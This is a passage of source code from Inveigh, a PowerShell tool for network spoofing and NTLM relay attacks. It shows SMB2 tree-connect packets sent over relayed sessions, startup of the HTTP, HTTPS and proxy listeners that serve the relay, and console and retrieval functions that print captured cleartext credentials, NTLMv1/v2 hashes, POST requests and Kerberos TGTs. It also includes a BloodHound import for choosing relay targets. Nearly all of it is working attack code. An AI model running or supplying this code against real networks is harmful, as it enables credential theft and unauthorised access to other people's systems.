$inveigh.session_lock_table[$session] = 'locked'\n                    $client = $inveigh.session_socket_table[$session]\n                    $client_stream = $client.GetStream()\n                    $session_ID = $inveigh.session_table[$session]\n                    $message_ID =  $inveigh.session_message_ID_table[$session]\n                    $tree_ID = 0x00,0x00,0x00,0x00\n                    $client_receive = New-Object System.Byte[] 1024\n                    $SMB_path = \"\\\\\" + $inveigh.session_socket_table[$session].Client.RemoteEndpoint.Address.IPaddressToString + \"\\IPC$\"\n                    $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)\n                    $message_ID++\n                    $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $false $message_ID $process_ID_bytes $tree_ID $session_ID\n                    $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes\n                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    \n                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length\n                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                    $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data\n\n                    try\n                    {\n                        $client_stream.Write($client_send,0,$client_send.Length) > $null\n                        $client_stream.Flush()\n                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null\n                    }\n                    catch\n                    {\n                        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Relay session $session has closed\") > $null\n                        $inveigh.session[$session] | Where-Object {$_.Status = \"disconnected\"}\n                    }\n\n                    if($inveigh.session_socket_table[$session].Connected)\n                    {\n                        $tree_ID = $client_receive[40..43]\n                        Start-Sleep -s 1\n                        $message_ID++\n                        $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $false $message_ID $process_ID_bytes $tree_ID $session_ID\n                        $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest\n                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data\n\n                        try\n                        {\n                            $client_stream.Write($client_send,0,$client_send.Length) > $null\n                            $client_stream.Flush()\n                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null\n                        }\n                        catch\n                        {\n                            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Relay session $session has closed\") > $null\n                            $inveigh.session[$session] | Where-Object {$_.Status = \"disconnected\"}\n                        }\n\n                    }\n\n                    $inveigh.session_lock_table[$Session] = 'open'\n                    $inveigh.session[$Session] | Where-Object {$_.\"Last Activity\" = Get-Date -format s}\n                    $inveigh.session_message_ID_table[$Session] = $message_ID\n                }\n\n                $session++\n                Start-Sleep -s 1\n            }\n         \n        }\n\n        Start-Sleep -s 1\n    }\n\n}\n\n#endregion\n#region begin startup functions\n\n # HTTP Listener Startup Function \nfunction HTTPListener\n{\n    $HTTP_runspace = [RunspaceFactory]::CreateRunspace()\n    $HTTPS_listener = $false\n    $proxy_listener = $false\n    $HTTP_runspace.Open()\n    $HTTP_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)\n    $HTTP_powershell = [PowerShell]::Create()\n    $HTTP_powershell.Runspace = $HTTP_runspace\n    $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) > $null\n    $HTTP_powershell.AddScript($packet_functions_scriptblock) > $null\n    $HTTP_powershell.AddScript($SMB_relay_functions_scriptblock) > $null\n    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Attack).AddArgument($Challenge).AddArgument(\n        $Command).AddArgument($Enumerate).AddArgument($EnumerateGroup).AddArgument($FailedLoginThreshold).AddArgument(\n        $HTTPIP).AddArgument($HTTPPort).AddArgument(\n        $HTTPS_listener).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(\n        $RelayAutoDisable).AddArgument($RepeatEnumerate).AddArgument($RepeatExecute).AddArgument(\n        $Service).AddArgument($SMB_version).AddArgument($SessionLimitPriv).AddArgument(\n        $SessionLimitUnpriv).AddArgument($SessionLimitShare).AddArgument($SessionPriority).AddArgument(\n        $Target).AddArgument($TargetMode).AddArgument($TargetRefresh).AddArgument($Username).AddArgument(\n        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null\n    $HTTP_powershell.BeginInvoke() > $null\n}\n\n# HTTPS Listener Startup Function \nfunction HTTPSListener\n{\n    $HTTPS_runspace = [RunspaceFactory]::CreateRunspace()\n    $HTTPS_listener = $true\n    $proxy_listener = $false\n    $HTTPS_runspace.Open()\n    $HTTPS_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)\n    $HTTPS_powershell = [PowerShell]::Create()\n    $HTTPS_powershell.Runspace = $HTTPS_runspace\n    $HTTPS_powershell.AddScript($shared_basic_functions_scriptblock) > $null\n    $HTTPS_powershell.AddScript($packet_functions_scriptblock) > $null\n    $HTTPS_powershell.AddScript($SMB_relay_functions_scriptblock) > $null\n    $HTTPS_powershell.AddScript($HTTP_scriptblock).AddArgument($Attack).AddArgument($Challenge).AddArgument(\n        $Command).AddArgument($Enumerate).AddArgument($EnumerateGroup).AddArgument($FailedLoginThreshold).AddArgument(\n        $HTTPIP).AddArgument($HTTPSPort).AddArgument(\n        $HTTPS_listener).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(\n        $RelayAutoDisable).AddArgument($RepeatEnumerate).AddArgument($RepeatExecute).AddArgument(\n        $Service).AddArgument($SMB_version).AddArgument($SessionLimitPriv).AddArgument(\n        $SessionLimitUnpriv).AddArgument($SessionLimitShare).AddArgument($SessionPriority).AddArgument(\n        $Target).AddArgument($TargetMode).AddArgument($TargetRefresh).AddArgument($Username).AddArgument(\n        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null\n    $HTTPS_powershell.BeginInvoke() > $null\n}\n\n# Proxy Listener Startup Function \nfunction ProxyListener\n{\n    $proxy_runspace = [RunspaceFactory]::CreateRunspace()\n    $HTTPS_listener = $false\n    $proxy_listener = $true\n    $proxy_runspace.Open()\n    $proxy_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)\n    $proxy_powershell = [PowerShell]::Create()\n    $proxy_powershell.Runspace = $proxy_runspace\n    $proxy_powershell.AddScript($shared_basic_functions_scriptblock) > $null\n    $proxy_powershell.AddScript($packet_functions_scriptblock) > $null\n    $proxy_powershell.AddScript($SMB_relay_functions_scriptblock) > $null\n    $proxy_powershell.AddScript($HTTP_scriptblock).AddArgument($Attack).AddArgument($Challenge).AddArgument(\n        $Command).AddArgument($Enumerate).AddArgument($EnumerateGroup).AddArgument($FailedLoginThreshold).AddArgument(\n        $ProxyIP).AddArgument($ProxyPort).AddArgument(\n        $HTTPS_listener).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(\n        $RelayAutoDisable).AddArgument($RepeatEnumerate).AddArgument($RepeatExecute).AddArgument(\n        $Service).AddArgument($SMB_version).AddArgument($SessionLimitPriv).AddArgument(\n        $SessionLimitUnpriv).AddArgument($SessionLimitShare).AddArgument($SessionPriority).AddArgument(\n        $Target).AddArgument($TargetMode).AddArgument($TargetRefresh).AddArgument($Username).AddArgument(\n        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null\n    $proxy_powershell.BeginInvoke() > $null\n}\n\n# Control Relay Startup Function\nfunction ControlRelayLoop\n{\n    $control_relay_runspace = [RunspaceFactory]::CreateRunspace()\n    $control_relay_runspace.Open()\n    $control_relay_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)\n    $control_relay_powershell = [PowerShell]::Create()\n    $control_relay_powershell.Runspace = $control_relay_runspace\n    $control_relay_powershell.AddScript($shared_basic_functions_scriptblock) > $null\n    $control_relay_powershell.AddScript($ADIDNS_functions_scriptblock) > $null\n    $control_relay_powershell.AddScript($packet_functions_scriptblock) > $null\n    $control_relay_powershell.AddScript($SMB_relay_functions_scriptblock) > $null\n    $control_relay_powershell.AddScript($control_relay_scriptblock).AddArgument($ConsoleQueueLimit).AddArgument(\n        $RelayAutoExit).AddArgument($RunTime) > $null\n    $control_relay_powershell.BeginInvoke() > $null\n}\n\n# Session Refresh Startup Function\nfunction SessionRefreshLoop\n{\n    $session_refresh_runspace = [RunspaceFactory]::CreateRunspace()\n    $session_refresh_runspace.Open()\n    $session_refresh_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)\n    $session_refresh_powershell = [PowerShell]::Create()\n    $session_refresh_powershell.Runspace = $session_refresh_runspace\n    $session_refresh_powershell.AddScript($shared_basic_functions_scriptblock) > $null\n    $session_refresh_powershell.AddScript($packet_functions_scriptblock) > $null\n    $session_refresh_powershell.AddScript($SMB_relay_functions_scriptblock) > $null\n    $session_refresh_powershell.AddScript($session_refresh_scriptblock).AddArgument($SessionRefresh) > $null\n    $session_refresh_powershell.BeginInvoke() > $null\n}\n\n#endregion\n#region begin startup enabled services\n\n# HTTP Server Start\nif($HTTP -eq 'Y')\n{\n    HTTPListener\n    Start-Sleep -m 50\n}\n\n# HTTPS Server Start\nif($HTTPS -eq 'Y')\n{\n    HTTPSListener\n    Start-Sleep -m 50\n}\n\n# Proxy Server Start\nif($Proxy -eq 'Y')\n{\n    ProxyListener\n    Start-Sleep -m 50\n}\n\n# Control Relay Loop Start\nControlRelayLoop\n\n# Session Refresh Loop Start\nif($SessionRefresh -gt 0)\n{\n    SessionRefreshLoop\n}\n\n# Console Output Loop\ntry\n{\n\n    if($ConsoleOutput -ne 'N')\n    {\n\n        if($ConsoleStatus)\n        {    \n            $console_status_timeout = New-TimeSpan -Minutes $ConsoleStatus\n            $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()\n        }\n\n        :console_loop while(($inveigh.relay_running -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))\n        {\n\n            while($inveigh.console_queue.Count -gt 0)\n            {\n\n                switch -wildcard ($inveigh.console_queue[0])\n                {\n\n                    {$_ -like \"?`[`!`]*\" -or $_ -like \"?`[-`]*\"}\n                    {\n\n                        if($inveigh.output_stream_only)\n                        {\n                            Write-Output($inveigh.console_queue[0] + $inveigh.newline)\n                        }\n                        else\n                        {\n                            Write-Warning($inveigh.console_queue[0])\n                        }\n\n                        $inveigh.console_queue.RemoveAt(0)\n                    }\n\n                    {$_ -like \"* spoofer is disabled\" -or $_ -like \"* local request\" -or $_ -like \"* host header *\" -or $_ -like \"* user agent received *\"}\n                    {\n\n                        if($ConsoleOutput -eq 'Y')\n                        {\n\n                            if($inveigh.output_stream_only)\n                            {\n                                Write-Output($inveigh.console_queue[0] + $inveigh.newline)\n                            }\n                            else\n                            {\n                                Write-Output($inveigh.console_queue[0])\n                            }\n\n                        }\n\n                        $inveigh.console_queue.RemoveAt(0)\n                    } \n\n                    {$_ -like \"* response sent\" -or $_ -like \"* ignoring *\" -or $_ -like \"* HTTP*request for *\" -or $_ -like \"* Proxy request for *\"}\n                    {\n                    \n                        if($ConsoleOutput -ne \"Low\")\n                        {\n\n                            if($inveigh.output_stream_only)\n                            {\n                                Write-Output($inveigh.console_queue[0] + $inveigh.newline)\n                            }\n                            else\n                            {\n                                Write-Output($inveigh.console_queue[0])\n                            }\n\n                        }\n\n                        $inveigh.console_queue.RemoveAt(0)\n                    } \n\n                    default\n                    {\n\n                        if($inveigh.output_stream_only)\n                        {\n                            Write-Output($inveigh.console_queue[0] + $inveigh.newline)\n                        }\n                        else\n                        {\n                            Write-Output($inveigh.console_queue[0])\n                        }\n\n                        $inveigh.console_queue.RemoveAt(0)\n                    }\n\n                }\n                \n            }\n\n            if($ConsoleStatus -and $console_status_stopwatch.Elapsed -ge $console_status_timeout)\n            {\n            \n                if($inveigh.cleartext_list.Count -gt 0)\n                {\n                    Write-Output(\"[*] [$(Get-Date -format s)] Current unique cleartext captures:\" + $inveigh.newline)\n                    $inveigh.cleartext_list.Sort()\n                    $POST_request_list_temp = $inveigh.POST_request_list\n\n                    foreach($unique_POST_request in $POST_request_list_temp)\n                    {\n                        if($unique_cleartext -ne $unique_cleartext_last)\n                        {\n                            Write-Output($unique_cleartext + $inveigh.newline)\n                        }\n\n                        $unique_cleartext_last = $unique_cleartext\n                    }\n\n                    Start-Sleep -m 5\n                }\n                else\n                {\n                    Write-Output(\"[+] [$(Get-Date -format s)] No cleartext credentials have been captured\" + $inveigh.newline)\n                }\n\n                if($inveigh.POST_request_list.Count -gt 0)\n                {\n                    Write-Output(\"[*] [$(Get-Date -format s)] Current unique POST request captures:\" + $inveigh.newline)\n                    $inveigh.POST_request_list.Sort()\n                    $NTLMv1_list_temp = $inveigh.NTLMv1_list\n\n                    foreach($unique_NTLMv1 in $NTLMv1_list_temp)\n                    {\n                        if($unique_POST_request -ne $unique_POST_request_last)\n                        {\n                            Write-Output($unique_POST_request + $inveigh.newline)\n                        }\n\n                        $unique_POST_request_last = $unique_POST_request\n                    }\n\n                    Start-Sleep -m 5\n                }\n            \n                if($inveigh.NTLMv1_list.Count -gt 0)\n                {\n                    Write-Output(\"[*] [$(Get-Date -format s)] Current unique NTLMv1 challenge/response captures:\" + $inveigh.newline)\n                    $inveigh.NTLMv1_list.Sort()\n                    $NTLMv1_username_list_temp = $inveigh.NTLMv1_username_list\n\n                    foreach($NTLMv1_username in $NTLMv1_username_list_temp)\n                    {\n                        $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(\":\",($unique_NTLMv1.IndexOf(\":\") + 2)))\n\n                        if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)\n                        {\n                            Write-Output($unique_NTLMv1 + $inveigh.newline)\n                        }\n\n                        $unique_NTLMv1_account_last = $unique_NTLMv1_account\n                    }\n\n                    $unique_NTLMv1_account_last = ''\n                    Start-Sleep -m 5\n                    Write-Output(\"[*] [$(Get-Date -format s)] Current NTLMv1 IP addresses and usernames:\" + $inveigh.newline)\n                    $NTLMv1_username_list_temp = $inveigh.NTLMv1_username_list\n\n                    foreach($NTLMv1_username in $NTLMv1_username_list_temp)\n                    {\n                        Write-Output($NTLMv1_username + $inveigh.newline)\n                    }\n\n                    Start-Sleep -m 5\n                }\n                else\n                {\n                    Write-Output(\"[+] [$(Get-Date -format s)] No NTLMv1 challenge/response hashes have been captured\" + $inveigh.newline)\n                }\n\n                if($inveigh.NTLMv2_list.Count -gt 0)\n                {\n                    Write-Output(\"[*] [$(Get-Date -format s)] Current unique NTLMv2 challenge/response captures:\" + $inveigh.newline)\n                    $inveigh.NTLMv2_list.Sort()\n                    $NTLMv2_list_temp = $inveigh.NTLMv2_list\n\n                    foreach($unique_NTLMv2 in $NTLMv2_list_temp)\n                    {\n                        $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(\":\",($unique_NTLMv2.IndexOf(\":\") + 2)))\n\n                        if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)\n                        {\n                            Write-Output($unique_NTLMv2 + $inveigh.newline)\n                        }\n\n                        $unique_NTLMv2_account_last = $unique_NTLMv2_account\n                    }\n\n                    $unique_NTLMv2_account_last = ''\n                    Start-Sleep -m 5\n                    Write-Output(\"[*] [$(Get-Date -format s)] Current NTLMv2 IP addresses and usernames:\" + $inveigh.newline)\n                    $NTLMv2_username_list_temp = $inveigh.NTLMv2_username_list\n\n                    foreach($NTLMv2_username in $NTLMv2_username_list_temp)\n                    {\n                        Write-Output($NTLMv2_username + $inveigh.newline)\n                    }\n                \n                }\n                else\n                {\n                    Write-Output(\"[+] [$(Get-Date -format s)] No NTLMv2 challenge/response hashes have been captured\" + $inveigh.newline)\n                }\n\n                $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()\n\n            }\n\n            if($inveigh.console_input)\n            {\n\n                if([Console]::KeyAvailable)\n                {\n                    $inveigh.console_output = $false\n                    BREAK console_loop\n                }\n        \n            }\n\n            Start-Sleep -m 5\n        }\n\n    }\n\n}\nfinally\n{\n\n    if($Tool -eq 2)\n    {\n        $inveigh.relay_running = $false\n    }\n\n}\n\n}\n\n#endregion\n#region begin support functions\n\nfunction Stop-Inveigh\n{\n<#\n.SYNOPSIS\nStop-Inveigh will stop all running Inveigh functions.\n#>\n\n    if($inveigh)\n    {\n        $inveigh.stop = $true\n        \n        if($inveigh.running -or $inveigh.relay_running)\n        {\n            $inveigh.console_queue.Clear()\n            Watch-Inveigh -NoConsoleMessage\n        }\n        else\n        {\n            Write-Output \"[-] There are no running Inveigh functions\"\n        }\n\n    }\n\n}\n\nfunction Get-Inveigh\n{\n<#\n.SYNOPSIS\nGet-Inveigh will get stored Inveigh data from memory.\n\n.PARAMETER Console\nGet queued console output. This is also the default if no parameters are set.\n\n.PARAMETER ADIDNS\nGet added DNS host records.\n\n.PARAMETER ADIDNSFailed\nGet failed DNS host record adds.\n\n.PARAMETER Cleartext\nGet captured cleartext credentials.\n\n.PARAMETER CleartextUnique\nGet unique captured cleartext credentials.\n\n.PARAMETER KerberosUsername\nGet IP addresses, usernames, and index for captured Kerberos TGTs.\n\n.PARAMETER KerberosTGT\nGet Kerberos TGT kirbi byte array by index.\n\n.PARAMETER Learning\nGet valid hosts discovered through spoofer learning.\n\n.PARAMETER Log\nGet log entries.\n\n.PARAMETER NTLMv1\nGet captured NTLMv1 challenge/response hashes.\n\n.PARAMETER NTLMv1Unique\nGet the first captured NTLMv1 challenge/response for each unique account.\n\n.PARAMETER NTLMv1Usernames\nGet IP addresses and usernames for captured NTLMv1 challenge/response hashes.\n\n.PARAMETER NTLMv2\nGet captured NTLMv1 challenge/response hashes.\n\n.PARAMETER NTLMv2Unique\nGet the first captured NTLMv2 challenge/response for each unique account.\n\n.PARAMETER NTLMv2Usernames\nGet IP addresses and usernames for captured NTLMv2 challenge/response hashes.\n\n.PARAMETER POSTRequest\nGet captured POST requests.\n\n.PARAMETER POSTRequestUnique\nGet unique captured POST request.\n\n.PARAMETER Session\nGet relay session list.\n#>\n\n    [CmdletBinding()]\n    param\n    ( \n        [parameter(Mandatory=$false)][Switch]$Cleartext,\n        [parameter(Mandatory=$false)][Switch]$CleartextUnique,\n        [parameter(Mandatory=$false)][Switch]$Console,\n        [parameter(Mandatory=$false)][Switch]$ADIDNS,\n        [parameter(Mandatory=$false)][Switch]$ADIDNSFailed,\n        [parameter(Mandatory=$false)][Int]$KerberosTGT,\n        [parameter(Mandatory=$false)][Switch]$KerberosUsername,\n        [parameter(Mandatory=$false)][Switch]$Learning,\n        [parameter(Mandatory=$false)][Switch]$Log,\n        [parameter(Mandatory=$false)][Switch]$NTLMv1,\n        [parameter(Mandatory=$false)][Switch]$NTLMv2,\n        [parameter(Mandatory=$false)][Switch]$NTLMv1Unique,\n        [parameter(Mandatory=$false)][Switch]$NTLMv2Unique,\n        [parameter(Mandatory=$false)][Switch]$NTLMv1Usernames,\n        [parameter(Mandatory=$false)][Switch]$NTLMv2Usernames,\n        [parameter(Mandatory=$false)][Switch]$POSTRequest,\n        [parameter(Mandatory=$false)][Switch]$POSTRequestUnique,\n        [parameter(Mandatory=$false)][Switch]$Session,\n        [parameter(Mandatory=$false)][Switch]$Enumerate,\n        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter\n    )\n\n    if($Console -or $PSBoundParameters.Count -eq 0)\n    {\n\n        while($inveigh.console_queue.Count -gt 0)\n        {\n\n            if($inveigh.output_stream_only)\n            {\n                Write-Output($inveigh.console_queue[0] + $inveigh.newline)\n                $inveigh.console_queue.RemoveAt(0)\n            }\n            else\n            {\n\n                switch -wildcard ($inveigh.console_queue[0])\n                {\n\n                    {$_ -like \"?`[`!`]*\" -or $_ -like \"?`[-`]*\"}\n                    {\n                        Write-Warning $inveigh.console_queue[0]\n                        $inveigh.console_queue.RemoveAt(0)\n                    }\n\n                    default\n                    {\n                        Write-Output $inveigh.console_queue[0]\n                        $inveigh.console_queue.RemoveAt(0)\n                    }\n\n                }\n\n            }\n            \n        }\n\n    }\n\n    if($ADIDNS)\n    {\n        $ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys\n\n        foreach($ADIDNS_host in $ADIDNS_table_keys_temp)\n        {\n            \n            if($inveigh.ADIDNS_table.$ADIDNS_host -ge 1)\n            {\n                Write-Output $ADIDNS_host\n            }\n\n        }\n\n    }\n\n    if($ADIDNSFailed)\n    {\n\n        $ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys\n\n        foreach($ADIDNS_host in $ADIDNS_table_keys_temp)\n        {\n            \n            if($inveigh.ADIDNS_table.$ADIDNS_host -eq 0)\n            {\n                Write-Output $ADIDNS_host\n            }\n\n        }\n\n    }\n\n    if($KerberosTGT)\n    {\n        Write-Output $inveigh.kerberos_TGT_list[$KerberosTGT]\n    }\n\n    if($KerberosUsername)\n    {\n        Write-Output $inveigh.kerberos_TGT_username_list\n    }\n\n    if($Log)\n    {\n        Write-Output $inveigh.log\n    }\n\n    if($NTLMv1)\n    {\n        Write-Output $inveigh.NTLMv1_list\n    }\n\n    if($NTLMv1Unique)\n    {\n        $inveigh.NTLMv1_list.Sort()\n        $NTLMv1_list_temp = $inveigh.NTLMv1_list\n\n        foreach($unique_NTLMv1 in $NTLMv1_list_temp)\n        {\n            $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(\":\",($unique_NTLMv1.IndexOf(\":\") + 2)))\n\n            if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)\n            {\n                Write-Output $unique_NTLMv1\n            }\n\n            $unique_NTLMv1_account_last = $unique_NTLMv1_account\n        }\n\n    }\n\n    if($NTLMv1Usernames)\n    {\n        Write-Output $inveigh.NTLMv2_username_list\n    }\n\n    if($NTLMv2)\n    {\n        Write-Output $inveigh.NTLMv2_list\n    }\n\n    if($NTLMv2Unique)\n    {\n        $inveigh.NTLMv2_list.Sort()\n        $NTLMv2_list_temp = $inveigh.NTLMv2_list\n\n        foreach($unique_NTLMv2 in $NTLMv2_list_temp)\n        {\n            $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(\":\",($unique_NTLMv2.IndexOf(\":\") + 2)))\n\n            if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)\n            {\n                Write-Output $unique_NTLMv2\n            }\n\n            $unique_NTLMv2_account_last = $unique_NTLMv2_account\n        }\n\n    }\n\n    if($NTLMv2Usernames)\n    {\n        Write-Output $inveigh.NTLMv2_username_list\n    }\n\n    if($Cleartext)\n    {\n        Write-Output $inveigh.cleartext_list\n    }\n\n    if($CleartextUnique)\n    {\n        Write-Output $inveigh.cleartext_list | Get-Unique\n    }\n\n    if($POSTRequest)\n    {\n        Write-Output $inveigh.POST_request_list\n    }\n\n    if($POSTRequestUnique)\n    {\n        Write-Output $inveigh.POST_request_list | Get-Unique\n    }\n\n    if($Learning)\n    {\n        Write-Output $inveigh.valid_host_list\n    }\n\n    if($Session)\n    {\n        $i = 0\n\n        while($i -lt $inveigh.session_socket_table.Count)\n        {\n\n            if(!$inveigh.session_socket_table[$i].Connected)\n            {\n                $inveigh.session[$i] | Where-Object {$_.Status = \"disconnected\"}\n            }\n        \n            $i++\n        }\n\n        Write-Output $inveigh.session | Format-Table -AutoSize\n    }\n\n    if($Enumerate)\n    {\n        Write-Output $inveigh.enumerate\n    }\n\n}\n\nfunction Watch-Inveigh\n{\n<#\n.SYNOPSIS\nWatch-Inveigh will enabled real time console output. If using this function through a shell, test to ensure that it doesn't hang the shell.\n\n.PARAMETER ConsoleOutput\n(Medium,Low) Medium and Low can be used to reduce output.\n#>\n\n[CmdletBinding()]\nparam\n( \n    [parameter(Mandatory=$false)][Switch]$NoConsoleMessage,\n    [parameter(Mandatory=$false)][ValidateSet(\"Low\",\"Medium\",\"Y\")][String]$ConsoleOutput = \"Y\",\n    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter\n)\n\nif($inveigh.tool -ne 1)\n{\n\n    if($inveigh.running -or $inveigh.relay_running)\n    {\n        \n        if(!$NoConsoleMessage)\n        {\n            Write-Output \"[*] Press any key to stop console output\"\n        }\n\n        $inveigh.console_output = $true\n\n        :console_loop while((($inveigh.running -or $inveigh.relay_running) -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))\n        {\n\n            while($inveigh.console_queue.Count -gt 0)\n            {\n\n                switch -wildcard ($inveigh.console_queue[0])\n                {\n\n                    {$_ -like \"?`[`!`]*\" -or $_ -like \"?`[-`]*\"}\n                    {\n                        Write-Warning $inveigh.console_queue[0]\n                        $inveigh.console_queue.RemoveAt(0)\n                    }\n\n                    {$_ -like \"*spoofer disabled]\" -or $_ -like \"*local request]\" -or $_ -like \"* host header *\" -or $_ -like \"* user agent received *\"}\n                    {\n\n                        if($ConsoleOutput -eq 'Y')\n                        {\n                            Write-Output $inveigh.console_queue[0]\n                        }\n\n                        $inveigh.console_queue.RemoveAt(0)\n\n                    } \n\n                    {$_ -like \"*response sent]\" -or $_ -like \"*ignoring*\" -or $_ -like \"* HTTP*request for *\" -or $_ -like \"* Proxy*request for *\" -or $_ -like \"*SYN packet*\"}\n                    {\n                    \n                        if($ConsoleOutput -ne \"Low\")\n                        {\n                            Write-Output $inveigh.console_queue[0]\n                        }\n\n                        $inveigh.console_queue.RemoveAt(0)\n\n                    } \n\n                    default\n                    {\n                        Write-Output $inveigh.console_queue[0]\n                        $inveigh.console_queue.RemoveAt(0)\n                    }\n\n                } \n\n            }\n\n            if([Console]::KeyAvailable)\n            {\n                $inveigh.console_output = $false\n                BREAK console_loop\n            }\n\n            Start-Sleep -m 5\n        }\n\n    }\n    else\n    {\n        Write-Output \"[-] Inveigh isn't running\"\n    }\n\n}\nelse\n{\n    Write-Output \"[-] Watch-Inveigh cannot be used with current external tool selection\"\n}\n\n}\n\nfunction Clear-Inveigh\n{\n<#\n.SYNOPSIS\nClear-Inveigh will clear Inveigh data from memory.\n#>\n\nif($inveigh)\n{\n\n    if(!$inveigh.running -and !$inveigh.relay_running)\n    {\n        Remove-Variable inveigh -scope global\n        Write-Output \"[+] Inveigh data has been cleared from memory\"\n    }\n    else\n    {\n        Write-Output \"[-] Run Stop-Inveigh before running Clear-Inveigh\"\n    }\n\n}\n\n}\n\nfunction ConvertTo-Inveigh\n{\n    <#\n    .SYNOPSIS\n    ConvertTo-Inveigh imports Bloodhound computers, groups and session JSON files into $inveigh.enumerate\n    for Inveigh Relay targeting.\n\n    .DESCRIPTION\n    For the fastest import, import the data before gather any enumeration data with Inveigh.\n\n    .PARAMETER BloodHoundComputersJSON\n    BloodHound computers file.\n\n    .PARAMETER BloodHoundSessionsJSON\n    BloodHound sessions file.\n\n    .PARAMETER BloodHoundGroupsJSON\n    BloodHound groups file.\n\n    .PARAMTER DNS\n    Enable DNS lookups\n    #>\n\n    [CmdletBinding()]\n    param\n    ( \n        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Computers,\n        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Sessions,\n        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Groups,\n        [parameter(Mandatory=$false)][Switch]$DNS,\n        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter\n    )\n\n    if(!$Computers -and !$Sessions -and !$Groups)\n    {\n        Write-Output \"Specifiy a BloodHound computers, groups, or sessions JSON file\"\n        throw\n    }\n\n    if($inveigh.running -or $inveigh.relay_running)\n    {\n        Write-Output \"Run Stop-Inveigh before importing data with ConvertTo-Inveigh\"\n        throw\n    }\n\n    if(!$inveigh)\n    {\n        $global:inveigh = [HashTable]::Synchronized(@{})\n        $inveigh.cleartext_list = New-Object System.Collections.ArrayList\n        $inveigh.enumerate = New-Object System.Collections.ArrayList\n        $inveigh.IP_capture_list = New-Object System.Collections.ArrayList\n        $inveigh.log = New-Object System.Collections.ArrayList\n        $inveigh.kerberos_TGT_list = New-Object System.Collections.ArrayList\n        $inveigh.kerberos_TGT_username_list = New-Object System.Collections.ArrayList\n        $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList\n        $inveigh.NTLMv1_username_list = New-Object System.Collections.ArrayList\n        $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList\n        $inveigh.NTLMv2_username_list = New-Object System.Collections.ArrayList\n        $inveigh.POST_request_list = New-Object System.Collections.ArrayList\n        $inveigh.valid_host_list = New-Object System.Collections.ArrayList\n        $inveigh.ADIDNS_table = [HashTable]::Synchronized(@{})\n        $inveigh.relay_privilege_table = [HashTable]::Synchronized(@{})\n        $inveigh.relay_failed_login_table = [HashTable]::Synchronized(@{})\n        $inveigh.relay_history_table = [HashTable]::Synchronized(@{})\n        $inveigh.request_table = [HashTable]::Synchronized(@{})\n        $inveigh.session_socket_table = [HashTable]::Synchronized(@{})\n        $inveigh.session_table = [HashTable]::Synchronized(@{})\n        $inveigh.session_message_ID_table = [HashTable]::Synchronized(@{})\n        $inveigh.session_lock_table = [HashTable]::Synchronized(@{})\n        $inveigh.SMB_session_table = [HashTable]::Synchronized(@{})\n        $inveigh.domain_mapping_table = [HashTable]::Synchronized(@{})\n        $inveigh.group_table = [HashTable]::Synchronized(@{})\n        $inveigh.session_count = 0\n        $inveigh.session = @()\n    }\n\n    function New-RelayEnumObject\n    {\n        param 